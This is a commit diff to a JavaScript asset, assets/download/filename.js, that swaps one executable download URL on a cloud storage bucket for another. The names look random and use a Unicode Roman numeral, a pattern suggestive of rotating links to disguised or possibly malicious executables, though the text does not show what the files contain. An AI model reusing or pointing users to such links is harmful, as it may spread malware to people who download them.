6c5b865b0359e1768ae22f202d82b1fdfffbadc7
soerxua <sdjteleg@outlook.com>
2025-09-23 01:56:29 +0800

    Update filename.js

--- assets/download/filename.js
+++ assets/download/filename.js
@@ -1,3 +1,3 @@
 (function() {
-    window.filename = 'https://u39997m.oss-ap-southeast-1.aliyuncs.com/tuoerxeang%E2%85%A9.exe';
+    window.filename = 'https://u39997m.oss-ap-southeast-1.aliyuncs.com/twzsxc%E2%85%A9elexe.exe';
 })();
